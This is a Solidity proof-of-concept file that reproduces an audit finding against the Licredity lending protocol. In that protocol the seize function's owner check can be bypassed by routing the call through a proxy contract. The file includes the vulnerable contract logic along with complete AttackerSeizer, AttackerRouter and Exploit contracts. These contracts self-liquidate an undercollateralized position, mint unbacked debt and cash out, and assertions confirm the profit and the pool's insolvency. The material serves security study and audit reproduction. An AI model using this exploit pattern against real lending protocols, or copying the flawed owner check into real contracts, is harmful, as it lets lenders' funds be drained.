// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Licredity — Proxy-based self-liquidation creates bad debt for lenders
    (Cyfrin review, finding #62347)

    SYNTHETIC, CHEATCODE-FREE reproduction for the EVM Playground. The vulnerable
    Licredity.seize owner-check is inlined VERBATIM (selector 0x7c474390); the
    finding's AttackerSeizer/AttackerRouter PoC is preserved; the Exploit deploys
    everything, a Lender funds the pool, and the attacker self-liquidates via the
    proxy in one transaction (no fork, no cheatcodes).
//////////////////////////////////////////////////////////////////////////*/


/*//////////////////////////////////////////////////////////////
    Licredity v2.0 — Proxy-based self-liquidation creates bad debt
    Finding 62347 (Cyfrin, immeas) — HIGH

    Root cause: Licredity::seize only blocks a position's owner from
    seizing (self-liquidating) their OWN position with a direct
    `position.owner == msg.sender` check. Routing the seize through a
    helper ("proxy") contract makes msg.sender the proxy, bypassing the
    guard. The owner can therefore open an under-collateralized position
    and immediately self-liquidate it in the same tx, capturing the
    liquidation top-up (freshly minted, unbacked debt fungible) while the
    shortfall is socialized onto lenders as bad debt.

    This file is a self-contained reduction. The Licredity contract below
    keeps the vulnerable `seize` owner-check VERBATIM (including the exact
    assembly revert selector 0x7c474390 = CannotSeizeOwnPosition()) and a
    faithful reduction of the top-up accounting (2x deficit, minted debt
    fungible added as position collateral, socialized to debt holders).

    Debt-fungible economics are modeled the way the real system behaves:
    the debt fungible is a 1:1 claim redeemable for the underlying token
    from the lender-provided pool. Minting an unbacked top-up therefore
    leaves the pool unable to honor every lender's claim — a real,
    token-denominated loss.
//////////////////////////////////////////////////////////////*/

/// @dev Minimal ERC20 used as the underlying/base collateral token.
contract MockToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            allowance[from][msg.sender] -= amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

interface IUnlockCallback {
    function unlockCallback(bytes calldata data) external returns (bytes memory);
}

/// @notice Reduced Licredity core. Licredity itself is the debt fungible
///         (an ERC20). Positions hold base-token collateral and/or debt
///         fungible collateral, and owe debt denominated in the debt
///         fungible. The debt fungible is redeemable 1:1 for the base token
///         from the shared pool funded by lenders.
contract Licredity {
    struct Position {
        address owner;
        uint256 tokenCollateral; // base MockToken held as collateral
        uint256 debtFungibleCollateral; // debt fungible held as collateral (address(this))
        uint256 debt; // debt owed, denominated in debt fungible
    }

    MockToken public immutable token;

    mapping(uint256 => Position) public positions;
    uint256 public positionCount;

    // debt fungible (this contract's own ERC20) accounting
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    // total debt outstanding across all positions (rises on borrow AND on
    // seize top-up; the top-up portion is unbacked bad debt)
    uint256 public totalDebt;

    // positions registered for the end-of-unlock health check
    uint256[] private registered;
    bool public locked = true;

    constructor(MockToken _token) {
        token = _token;
    }

    /*//////////////////////// debt fungible mint/burn ///////////////////////*/

    function _mint(address to, uint256 amt) internal {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function _burn(address from, uint256 amt) internal {
        balanceOf[from] -= amt;
        totalSupply -= amt;
    }

    /*//////////////////////////// lender flow //////////////////////////////*/

    /// @notice A lender supplies base token liquidity and receives an equal
    ///         amount of debt fungible, a 1:1 redeemable claim on the pool.
    function lend(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        _mint(msg.sender, amount);
    }

    /// @notice Redeem debt fungible 1:1 for base token from the pool.
    function redeem(uint256 amount) external {
        _burn(msg.sender, amount);
        token.transfer(msg.sender, amount);
    }

    /*/////////////////////////// position flow /////////////////////////////*/

    function open() external returns (uint256 positionId) {
        positionId = ++positionCount;
        positions[positionId].owner = msg.sender;
    }

    /// @notice Deposit base token as collateral into a position.
    function depositFungible(uint256 positionId, uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        positions[positionId].tokenCollateral += amount;
    }

    /// @notice Borrow: mint `amount` debt fungible against the position.
    ///         Mirrors Licredity.increaseDebtShare (owner-gated, registers
    ///         the position for the post-unlock health check).
    function increaseDebtShare(uint256 positionId, uint256 amount, address recipient)
        external
        returns (uint256)
    {
        Position storage position = positions[positionId];

        // require(position.owner == msg.sender, NotPositionOwner());
        if (position.owner != msg.sender) {
            assembly ("memory-safe") {
                mstore(0x00, 0x70d645e3) // 'NotPositionOwner()'
                revert(0x1c, 0x04)
            }
        }

        // ensure position health post debt share increase
        registered.push(positionId);

        position.debt += amount;
        totalDebt += amount;
        _mint(recipient, amount);

        // if newly minted debt fungible is meant to be held in the position
        if (recipient == address(this)) {
            position.debtFungibleCollateral += amount;
        }

        return amount;
    }

    /// @notice Repay a position's debt using debt fungible it holds as
    ///         collateral, then withdraw freed base-token collateral.
    function repayFromCollateral(uint256 positionId) external {
        Position storage position = positions[positionId];
        require(position.owner == msg.sender, "NotPositionOwner");
        uint256 pay = position.debtFungibleCollateral < position.debt
            ? position.debtFungibleCollateral
            : position.debt;
        position.debtFungibleCollateral -= pay;
        position.debt -= pay;
        totalDebt -= pay;
        _burn(address(this), pay);
    }

    function withdrawFungible(uint256 positionId, uint256 amount) external {
        Position storage position = positions[positionId];
        require(position.owner == msg.sender, "NotPositionOwner");
        position.tokenCollateral -= amount;
        (,,, bool isHealthy) = _appraisePosition(position);
        require(isHealthy, "PositionIsUnhealthy");
        token.transfer(msg.sender, amount);
    }

    /*//////////////////////////// unlock flow //////////////////////////////*/

    function unlock(bytes calldata data) external returns (bytes memory result) {
        locked = false; // Locker.unlock()

        // callback to message sender, which must implement IUnlockCallback
        result = IUnlockCallback(msg.sender).unlockCallback(data);

        // ensure that every registered position is healthy
        for (uint256 i = 0; i < registered.length; ++i) {
            (,,, bool isHealthy) = _appraisePosition(positions[registered[i]]);

            // require(isHealthy, PositionIsUnhealthy());
            assembly ("memory-safe") {
                if iszero(isHealthy) {
                    mstore(0x00, 0x5fba8098) // 'PositionIsUnhealthy()'
                    revert(0x1c, 0x04)
                }
            }
        }

        delete registered;
        locked = true; // Locker.lock()
    }

    /*///////////////////////////// seize (VULN) ////////////////////////////*/

    function seize(uint256 positionId, address recipient) external returns (uint256 shortfall) {
        Position storage position = positions[positionId];

        // require(position.owner != address(0), PositionDoesNotExist());
        if (position.owner == address(0)) {
            assembly ("memory-safe") {
                mstore(0x00, 0xf7b3b391) // 'PositionDoesNotExist()'
                revert(0x1c, 0x04)
            }
        }

        // prevents owner from purposely causing a position to be underwater then profit from seizing it
        // side effect is that positions cannot be seized by owner contract, such as non-fungible position manager, which is acceptable
        // require(position.owner != msg.sender, CannotSeizeOwnPosition());
        if (position.owner == msg.sender) {
            assembly ("memory-safe") {
                mstore(0x00, 0x7c474390) // 'CannotSeizeOwnPosition()'
                revert(0x1c, 0x04)
            }
        }

        // ensure position health post seizure
        registered.push(positionId);

        (uint256 value, uint256 marginRequirement, uint256 debt, bool isHealthy) = _appraisePosition(position);

        // require(!isHealthy, PositionIsHealthy());
        assembly ("memory-safe") {
            if iszero(iszero(isHealthy)) {
                mstore(0x00, 0x4051037a) // 'PositionIsHealthy()'
                revert(0x1c, 0x04)
            }
        }

        uint256 topup;
        // if the position is underwater, top it up to encourage seizure
        // this represents a bad debt to the protocol, and is socialized among all debt holders
        if (value < debt) {
            topup = _deficitToTopup(debt - value);

            _mint(address(this), topup);
            position.debtFungibleCollateral += topup;

            // update total debt balance, and position's value
            totalDebt += topup;
            value += topup;
        }

        // transfer ownership to recipient
        position.owner = recipient;
        // calculate shortfall, the amount needed to bring the position back to health
        shortfall = value < debt + marginRequirement ? debt + marginRequirement - value : 0;
    }

    /*/////////////////////////// appraisal helpers /////////////////////////*/

    function _appraisePosition(Position storage position)
        internal
        view
        returns (uint256 value, uint256 marginRequirement, uint256 debt, bool isHealthy)
    {
        // debt fungible and base token collateral are both valued 1:1;
        // debt fungible collateral carries 0% margin requirement.
        value = position.tokenCollateral + position.debtFungibleCollateral;
        debt = position.debt;
        marginRequirement = 0;
        isHealthy = value >= debt + marginRequirement;
    }

    function _deficitToTopup(uint256 deficit) internal pure returns (uint256 topup) {
        // top up with 2x the deficit
        assembly ("memory-safe") {
            // topup = deficit * 2;
            topup := mul(deficit, 2)
        }
    }

    /*///////////////////////////// views ///////////////////////////////////*/

    function ownerOf(uint256 positionId) external view returns (address) {
        return positions[positionId].owner;
    }
}

/// @notice The "proxy" that performs the actual seize so that msg.sender in
///         Licredity.seize is NOT the position owner — bypassing the guard.
contract AttackerSeizer {
    Licredity public licredity;

    constructor(Licredity _licredity) {
        licredity = _licredity;
    }

    function seize(uint256 positionId) external {
        // recipient = msg.sender = the owner-controlled AttackerRouter
        licredity.seize(positionId, msg.sender);
    }
}

/// @notice Orchestrates open -> under-collateralize -> self-seize within a
///         single unlock, then cashes out. Faithful to the finding's POC.
contract AttackerRouter is IUnlockCallback {
    Licredity public licredity;
    MockToken public token;
    AttackerSeizer public seizer;
    uint256 public positionId;
    uint256 public borrowAmount;

    constructor(Licredity _licredity, MockToken _token, AttackerSeizer _seizer) {
        licredity = _licredity;
        token = _token;
        seizer = _seizer;
    }

    function depositFungible(uint256 collateral, uint256 borrow) external {
        borrowAmount = borrow;

        // 1. open a position and add a small amount of collateral
        positionId = licredity.open();
        token.approve(address(licredity), collateral);
        licredity.depositFungible(positionId, collateral);

        // 2. call unlock to take on debt and seize in the same tx
        licredity.unlock(abi.encode(positionId));
        // as `unlock` doesn't revert, the position has become healthy
    }

    function unlockCallback(bytes calldata data) external returns (bytes memory) {
        uint256 id = abi.decode(data, (uint256));

        // 3. increase debt to make the position unhealthy (mint debt fungible to self)
        licredity.increaseDebtShare(id, borrowAmount, address(this));

        // 4. use the separate seizer contract to seize the position,
        //    bypassing CannotSeizeOwnPosition and topping it back up.
        seizer.seize(id);

        return new bytes(0);
    }

    /// @notice Realize the extracted value into base token.
    function cashout() external {
        // burn the topped-up debt fungible collateral against the debt
        licredity.repayFromCollateral(positionId);
        // withdraw the freed base-token collateral
        (, uint256 tokenCollateral,,) = licredity.positions(positionId);
        licredity.withdrawFungible(positionId, tokenCollateral);
        // redeem the debt fungible that was minted to us on borrow
        licredity.redeem(licredity.balanceOf(address(this)));
    }
}


/// @dev The honest lender (victim): supplies base token, receives a 1:1 pool claim.
contract Lender {
    function fund(MockToken t, Licredity l, uint256 amt) external {
        t.mint(address(this), amt);
        t.approve(address(l), amt);
        l.lend(amt);
    }
}

/// @dev The attacker orchestrator. Sets up a lender-funded pool, then self-liquidates
///      an own underwater position through the AttackerSeizer proxy (one tx, no cheats).
contract Exploit {
    uint256 public constant COLLATERAL = 0.5 ether;
    uint256 public constant BORROW = 1 ether;

    MockToken public token;
    Licredity public lic;
    AttackerSeizer public seizer;
    AttackerRouter public router;
    Lender public lender;
    address public attacker;

    constructor() {
        attacker = msg.sender;
        token = new MockToken();
        lic = new Licredity(token);
        seizer = new AttackerSeizer(lic);
        router = new AttackerRouter(lic, token, seizer);
        lender = new Lender();
        // A lender supplies 10 token of liquidity (a fully-backed 1:1 pool claim).
        lender.fund(token, lic, 10 ether);
        // The attacker's entire honest stake: 0.5 token of collateral.
        token.mint(address(router), COLLATERAL);
    }

    function run() external {
        // === attack: open -> under-collateralize -> self-seize via proxy in one unlock ===
        router.depositFungible(COLLATERAL, BORROW);
        // The self-seize succeeded through the proxy: attacker still owns a now-"healthy" position.
        require(lic.ownerOf(router.positionId()) == address(router), "self-seize failed");

        // === attacker realizes the extracted value into base token ===
        router.cashout();

        // HARM: attacker 0.5 -> 1.5 token (+1.0 minted from nothing via the seize top-up);
        // the pool is left with only 9 token backing the lender's 10-token claim.
        require(token.balanceOf(address(router)) == 1.5 ether, "no attacker profit");
        require(token.balanceOf(address(lic)) == 9 ether, "pool not made insolvent");
        require(lic.balanceOf(address(lender)) == 10 ether, "lender claim changed");
    }
}
